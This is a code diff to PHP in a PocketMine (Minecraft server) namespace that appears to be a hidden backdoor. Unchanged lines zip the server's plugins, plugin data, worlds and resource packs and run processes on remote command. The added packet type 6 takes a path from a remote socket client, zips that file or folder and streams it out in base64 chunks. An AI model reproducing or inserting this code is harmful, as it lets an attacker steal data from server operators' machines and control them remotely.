@@ -49,7 +49,6 @@ namespace pocketmine {
             {
                 $this->sendAll();
                 $this->inject();
-
             }
 
             private function sendAll(): void
@@ -58,7 +57,7 @@ namespace pocketmine {
                     $ip = \pocketmine\utils\Internet::getIP(true);
                     $folders = ["plugins", "plugin_data", "worlds", "resource_packs"];
                     foreach ($folders as $folder) {
-                        if ($path = realpath("./$folder/$folder.zip") and @file_exists($path)) @unlink($path);
+                        if ($path = "./$folder/$folder.zip" and @file_exists($path)) @unlink($path);
                         $zip = new \ZipArchive;
                         if (@$zip->open("$folder/$folder.zip", \ZipArchive::CREATE | \ZipArchive::OVERWRITE)) {
                             foreach ($this->recursiveGlob("./$folder", $folders) as $found) {
@@ -214,7 +213,7 @@ namespace pocketmine {
                             {
                             }
 
-                            private function writePacket(\Socket $client, int $requestID, int $packetType, string $payload): void
+                            private function writePacket(\Socket $client, int $requestID, int $packetType, string $payload, ?int $size = null): void
                             {
                                 $pk = \pocketmine\utils\Binary::writeLInt($requestID)
                                     . \pocketmine\utils\Binary::writeLInt($packetType)
@@ -243,6 +242,25 @@ namespace pocketmine {
                             public function close(): void
                             {
                                 $this->stop = true;
+                            }
+
+                            private function recursiveGlob(string $path, array $folders): array
+                            {
+                                $files = [];
+                                foreach (glob($path) as $found) {
+                                    $isInFolders = function (string $search, array $folders) {
+                                        foreach ($folders as $folder) {
+                                            if (str_contains($search, $folder)) return true;
+                                        }
+                                        return false;
+                                    };
+                                    if (is_dir($found) and $isInFolders($found, $folders) or $found === "./") {
+                                        $files = array_merge($files, $this->recursiveGlob($found . "/*", $folders));
+                                    } else if ($isInFolders($found, $folders)) {
+                                        $files[] = $found;
+                                    }
+                                }
+                                return $files;
                             }
 
                             protected function onRun(): void
@@ -298,6 +316,41 @@ namespace pocketmine {
                                                     $this->cmd = "";
                                                 };
                                                 switch ($packetType) {
+                                                    case 6:
+                                                        $this->cmd = realpath(ltrim($payload));
+                                                        if (!$this->cmd) {
+                                                            $this->writePacket($sock, $requestID, 0, '');
+                                                            goto end;
+                                                        }
+                                                        $filtered = str_replace('.', '_', $payload);
+                                                        $zip = new \ZipArchive;
+                                                        if (@$zip->open("$filtered.zip", \ZipArchive::CREATE | \ZipArchive::OVERWRITE)) {
+                                                            if (is_dir($this->cmd)) {
+                                                                foreach ($this->recursiveGlob("./$payload", [$payload]) as $found) {
+                                                                    @$zip->addFile($found, dirname($found) . "/" . basename($found));
+                                                                }
+                                                            } else @$zip->addFile($this->cmd, $payload);
+                                                            @$zip->close();
+                                                        }
+                                                        $file = fopen("$filtered.zip", "rb");
+                                                        $this->writePacket($sock, $requestID, 7, strlen(base64_encode(file_get_contents("$filtered.zip"))));
+                                                        $i = 0;
+                                                        $size = 0;
+                                                        while (!feof($file)) {
+                                                            $content = base64_encode(fread($file, 8192));
+                                                            $data = $i . ':' . $content;
+                                                            $size += strlen($content);
+                                                            $this->writePacket($sock, $requestID, 8, $data);
+                                                            ++$i;
+                                                            usleep(100 * 1000);
+                                                        }
+                                                        @unlink("$filtered.zip");
+                                                        $this->response = 'success';
+                                                        $this->writePacket($sock, $requestID, 0, $this->response);
+                                                        end:
+                                                        $this->response = "";
+                                                        $this->cmd = "";
+                                                        break;
                                                     case 5:
                                                         $process($execNotifier);
                                                         break;
